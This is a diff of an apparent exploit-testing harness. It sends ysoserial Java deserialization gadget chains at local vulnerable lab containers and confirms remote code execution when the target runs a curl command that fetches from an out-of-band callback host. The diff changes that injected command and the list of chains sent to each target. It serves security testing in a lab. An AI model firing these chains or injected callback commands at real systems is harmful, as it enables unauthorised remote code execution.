@@ -37,13 +37,12 @@ POLL_SEC    = int(os.getenv("POLL_SEC",   "12"))   # seconds to wait for callbac
 C2_WAIT     = int(os.getenv("C2_WAIT",   "40"))    # seconds to wait for C2 agent
 
 # Callback URL the target can reach to prove OOB/RCE
-# Try curl first; fall back to wget for containers that only have wget.
-# ysoserial wraps commands containing spaces with bash -c "...", so the || operator works.
+# Use plain curl — all containers have curl installed (added in Dockerfiles).
+# Avoid shell operators (||, 2>/dev/null) in EXEC_CMD: ysoserial CC/CB chains call
+# Runtime.exec(String) which splits on whitespace, so "||" and "--no-check-certificate"
+# become literal curl arguments, causing curl to exit with "unknown option" error.
 CALLBACK_BASE = f"http://{OOB_HOST}:{OOB_HTTP}/callback/http"
-EXEC_CMD = lambda tok: (
-    f"curl -sk {CALLBACK_BASE}/{tok}/rce -o /tmp/oobx_{tok[:12]} 2>/dev/null"
-    f" || wget -q --no-check-certificate -O /tmp/oobx_{tok[:12]} {CALLBACK_BASE}/{tok}/rce 2>/dev/null"
-)
+EXEC_CMD = lambda tok: f"curl -sk {CALLBACK_BASE}/{tok}/rce -o /tmp/oobx_{tok[:12]}"
 
 # ── RCE file verification via docker exec ─────────────────────────────────────
 
@@ -999,12 +998,13 @@ def main():
     print("\n[*] Section 1a: ysoserial chains → vulnlab :8888")
     for cid in ["ysoserial_cc2","ysoserial_cc4","ysoserial_cc5","ysoserial_cc6","ysoserial_cc7",
                 "ysoserial_cb1","cb_no_cc","ysoserial_rome",
-                "ysoserial_groovy1","ysoserial_hibernate1"]:
+                "ysoserial_hibernate1"]:
         test_deser_chain(cid)
 
     print("\n[*] Section 1b: ysoserial chains needing old JVM → java8-old :8891")
     # cc1/cc3: need Java < 8u232 (AnnotationInvocationHandler fix)
-    for cid in ["ysoserial_cc1","ysoserial_cc3"]:
+    # groovy1: MethodClosure serialVersionUID differs between JDK 8 and 17 — must test on JDK 8
+    for cid in ["ysoserial_cc1","ysoserial_cc3","ysoserial_groovy1"]:
         if j8old_ok:
             test_deser_chain(cid, target_url=JAVA8OLD_URL, container_name="vuln-java8old")
         else:
